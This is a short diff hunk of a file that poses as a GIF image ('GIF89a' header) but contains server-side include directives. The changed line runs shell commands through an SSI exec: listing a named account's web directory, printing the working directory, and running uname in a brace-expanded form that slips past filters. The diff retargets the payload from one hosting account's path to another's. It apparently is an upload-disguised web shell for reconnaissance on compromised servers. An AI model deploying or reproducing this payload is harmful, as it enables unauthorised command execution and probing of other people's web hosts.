@@ -5,4 +5,4 @@ GIF89a1
 <br>
 <!--#echo var="SERVER_ADDR" -->
 <br>
-<!--#exec cmd="ls /home/lon11763/domains;dir;pwd;{uname,-a}" -->
+<!--#exec cmd="ls /home/innovati/public_html;dir;pwd;{uname,-a}" -->
